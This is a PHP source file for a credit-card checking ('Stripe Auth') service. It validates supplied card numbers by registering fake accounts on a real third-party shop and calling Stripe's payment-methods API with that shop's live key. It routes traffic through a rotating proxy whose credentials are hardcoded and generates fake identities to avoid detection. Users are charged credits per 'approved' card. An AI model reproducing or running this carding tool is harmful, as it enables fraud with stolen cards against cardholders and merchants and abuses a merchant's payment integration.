<?php
header('Content-Type: application/json');
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Verificar sesión y créditos
session_start();
$path = $_SERVER["DOCUMENT_ROOT"];

// Manejar errores de inclusión
try {
    require_once $path . "/api/v1.1/core/brain.php";
} catch (Exception $e) {
    error_log("Error al cargar brain.php: " . $e->getMessage());
    echo json_encode(['status' => 'Error', 'response' => 'Error al cargar el sistema']);
    exit;
}

// Verificar que la conexión a la base de datos existe
if (!isset($connection) || !($connection instanceof PDO)) {
    error_log("Error: No hay conexión a la base de datos");
    echo json_encode(['status' => 'Error', 'response' => 'Error de conexión a la base de datos']);
    exit;
}

if (!isset($_SESSION["user_id"])) {
    echo json_encode(['status' => 'Error', 'response' => 'No hay sesión activa']);
    exit;
}

try {
    $user = $_SESSION["user_id"];
    $query = $connection->prepare("SELECT * FROM breathe_users WHERE id=:id");
    $query->bindParam("id", $user, PDO::PARAM_STR);
    $query->execute();
    $result = $query->fetch(PDO::FETCH_ASSOC);

    if (!$result) {
        echo json_encode(['status' => 'Error', 'response' => 'Usuario no encontrado']);
        exit;
    }

    $credits = $result["creditos"];

    if ($credits < 2) {
        echo json_encode(['status' => 'Error', 'response' => 'Créditos insuficientes']);
        exit;
    }
} catch (PDOException $e) {
    error_log("Error al verificar créditos: " . $e->getMessage());
    echo json_encode(['status' => 'Error', 'response' => 'Error al verificar créditos']);
    exit;
}

// Función para escribir logs
function writeLog($message) {
    $logFile = 'stripe_log.txt';
    $timestamp = date('Y-m-d H:i:s');
    $logMessage = "[$timestamp] $message\n";
    file_put_contents($logFile, $logMessage, FILE_APPEND);
}

// Función para extraer texto entre dos strings
function FindBetween($text, $start, $end) {
    $start_pos = strpos($text, $start);
    if ($start_pos === false) {
        return '';
    }
    $start_pos += strlen($start);
    $end_pos = strpos($text, $end, $start_pos);
    if ($end_pos === false) {
        return '';
    }
    return substr($text, $start_pos, $end_pos - $start_pos);
}

// Función para generar datos de usuario falsos
function generateFakeUser() {
    $firstNames = ['John', 'Emma', 'Michael', 'Sophia', 'William', 'Olivia', 'James', 'Ava', 'Robert', 'Isabella'];
    $lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez'];
    $domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com'];
    
    $firstName = $firstNames[array_rand($firstNames)];
    $lastName = $lastNames[array_rand($lastNames)];
    $email = strtolower($firstName . '.' . $lastName . rand(100, 999) . '@' . $domains[array_rand($domains)]);
    $phone = '+1' . rand(200, 999) . rand(200, 999) . rand(1000, 9999);
    
    $streets = ['Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln', 'Pine Rd'];
    $cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix'];
    $states = ['NY', 'CA', 'IL', 'TX', 'AZ'];
    $zips = [rand(10000, 99999)];
    
    $userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' . rand(80, 99) . '.0.' . rand(1000, 9999) . '.' . rand(100, 999) . ' Safari/537.36';
    
    return [
        'first_name' => $firstName,
        'last_name' => $lastName,
        'email' => $email,
        'phone' => [
            'format2' => $phone
        ],
        'userAgent' => $userAgent,
        'street' => rand(100, 999) . ' ' . $streets[array_rand($streets)],
        'city' => $cities[array_rand($cities)],
        'state' => $states[array_rand($states)],
        'zip' => $zips[array_rand($zips)]
    ];
}

function processStripePayment($cc, $mes, $ano, $cvv) {
    try {
        writeLog("Iniciando proceso de Stripe");
        
        // Iniciar temporizador
        $starttim = microtime(true);

        // Generar datos de usuario aleatorios
        writeLog("Generando datos de usuario");
        $userData = generateFakeUser();
        $firstName = $userData['first_name'];
        $lastName = $userData['last_name'];
        $email = $userData['email'];
        $phone = $userData['phone']['format2'];
        $userAgent = $userData['userAgent'];
        $street = $userData['street'];
        $state = $userData['state'];
        $city = $userData['city'];
        $zip = $userData['zip'];
        writeLog("Datos de usuario generados: $email");

        // Configurar proxy y cookie
        $cookie = uniqid();
        $proxy = getenv('PROXY_URL') ?: 'http://rvrqudhp-rotate:918d6xnqwql1@p.webshare.io:80';
        writeLog("Proxy configurado: $proxy");

        // Verificar que el proxy está configurado correctamente
        if (empty($proxy)) {
            writeLog("Error: No hay proxy configurado");
            echo json_encode(['status' => 'Error', 'response' => 'Error de configuración del proxy']);
            exit;
        }

        // Obtener página de cuenta
        writeLog("Obteniendo página de cuenta");
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.daataadirect.co.uk/my-account/");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: es-ES,es;q=0.9,en;q=0.8',
            'referer: https://www.daataadirect.co.uk/my-account/',
            'user-agent: ' . $userAgent
        ]);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
        $response = curl_exec($ch);
        
        if ($response === false) {
            $error = curl_error($ch);
            writeLog("Error en curl: $error");
            return ['status' => 'Error', 'response' => "Error en la conexión: $error"];
        }

        // Obtener nonce
        $nonce = FindBetween($response, 'name="woocommerce-register-nonce" value="', '"');
        if (!$nonce) {
            $nonce = FindBetween($response, 'name="woocommerce-login-nonce" value="', '"');
        }
        if (!$nonce) {
            $nonce = FindBetween($response, 'name="woocommerce-add-payment-method-nonce" value="', '"');
        }

        if (!$nonce) {
            writeLog("Error: No se pudo obtener el nonce de registro");
            // Intentar obtener el nonce de otra manera
            $nonce = FindBetween($response, 'name="_wpnonce" value="', '"');
            if (!$nonce) {
                return [
                    'status' => 'Declined!❌',
                    'response' => 'Error de autenticación',
                    'card' => "$cc|$mes|$ano|$cvv",
                    'type' => "Credit Card",
                    'bank' => "Unknown",
                    'country' => "Unknown",
                    'time' => intval(microtime(true) - $starttim),
                    'gateway' => 'Stripe Auth'
                ];
            }
        }

        // Registrar cuenta
        writeLog("Registrando cuenta");
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.daataadirect.co.uk/my-account/");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: es-ES,es;q=0.9,en;q=0.8',
            'content-type: application/x-www-form-urlencoded',
            'referer: https://www.daataadirect.co.uk/my-account/payment-methods/',
            'user-agent: ' . $userAgent
        ]);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
        $data = 'email=' . urlencode($email) . '&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fwww.daataadirect.co.uk%2Fmy-account%2Fpayment-methods%2F&wc_order_attribution_session_start_time=2024-11-23+13%3A05%3A28&wc_order_attribution_session_pages=22&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=' . urlencode($userAgent) . '&woocommerce-register-nonce=' . $nonce . '&_wp_http_referer=%2Fmy-account%2F&register=Register';
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        $response = curl_exec($ch);

        // Crear método de pago en Stripe
        writeLog("Creando método de pago en Stripe");
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_methods");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: application/json',
            'accept-language: es-ES,es;q=0.9,en;q=0.8',
            'referer: https://js.stripe.com/',
            'user-agent: ' . $userAgent
        ]);
        $data = 'type=card&card[number]=' . $cc . '&card[cvc]=' . $cvv . '&card[exp_month]=' . $mes . '&card[exp_year]=' . $ano . '&guid=cbbecb3a-8424-449d-9c9c-0898a02713064ba8d5&muid=05ef9f8e-f3c2-49ec-aa35-f788ce8ac601f4a377&sid=a1b65bc7-a5fa-4eba-9de6-b89578ef549163bb0b&payment_user_agent=stripe.js%2F0e1c4eec9a%3B+stripe-js-v3%2F0e1c4eec9a%3B+split-card-element&referrer=https%3A%2F%2Fwww.daataadirect.co.uk&time_on_page=22500&key=pk_live_51H3MC3AYHpRLqymffVDTx7ne4oAbcdBRPDNTJXRcBp7urh47hr6lSsnNYvgoTjeZL7uS7gwmk0Ss2EjLewmN2Atr00fv1kO75K&_stripe_version=2022-08-01';
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        $response = curl_exec($ch);
        
        if ($response === false) {
            $error = curl_error($ch);
            writeLog("Error en Stripe API: $error");
            return [
                'status' => 'Declined!❌',
                'response' => 'Error de conexión con Stripe',
                'card' => "$cc|$mes|$ano|$cvv",
                'type' => "Credit Card",
                'bank' => "Unknown",
                'country' => "Unknown",
                'time' => intval(microtime(true) - $starttim),
                'gateway' => 'Stripe Auth'
            ];
        }

        writeLog("Respuesta de Stripe: " . substr($response, 0, 100));
        $key = FindBetween($response, ' "id": "', '"');
        $errormessage = FindBetween($response, ' "message": "', '"');

        // Procesar respuesta de Stripe
        if (strpos($response, '"error":') !== false) {
            $status = "Declined!❌";
            $response_text = $errormessage ?: "Tarjeta rechazada";
        } else if ($key) {
            $status = "Approved!✅";
            $response_text = "Tarjeta aprobada";
            
            // Cobrar 2 créditos por tarjeta aprobada
            $balance = $credits - 2;
            $query = $connection->prepare("UPDATE breathe_users SET creditos=:creditos WHERE id=:id");
            $query->bindParam("id", $user, PDO::PARAM_STR);
            $query->bindParam("creditos", $balance, PDO::PARAM_STR);
            $query->execute();
        } else {
            $status = "Declined!❌";
            $response_text = "Error en la validación";
        }

        // Calcular tiempo de procesamiento
        $starttime = intval(microtime(true) - $starttim);

        // Retornar resultado
        return [
            'status' => $status,
            'response' => $response_text,
            'card' => "$cc|$mes|$ano|$cvv",
            'type' => "Credit Card",
            'bank' => "Unknown",
            'country' => "Unknown",
            'time' => $starttime,
            'gateway' => 'Stripe Auth'
        ];

    } catch (Exception $e) {
        writeLog("Error: " . $e->getMessage());
        return ['status' => 'Error', 'response' => $e->getMessage()];
    }
}

// Procesar la solicitud POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['ccs'])) {
        $ccs = $_POST['ccs'];
        $parts = explode('|', $ccs);
        
        if (count($parts) === 4) {
            $cc = $parts[0];
            $mes = $parts[1];
            $ano = $parts[2];
            $cvv = $parts[3];
            
            $result = processStripePayment($cc, $mes, $ano, $cvv);
            echo json_encode($result);
        } else {
            echo json_encode([
                'status' => 'Error',
                'response' => 'Formato de tarjeta inválido'
            ]);
        }
    } else {
        echo json_encode([
            'status' => 'Error',
            'response' => 'No se proporcionó información de tarjeta'
        ]);
    }
} else {
    echo json_encode([
        'status' => 'Error',
        'response' => 'Método no permitido'
    ]);
} 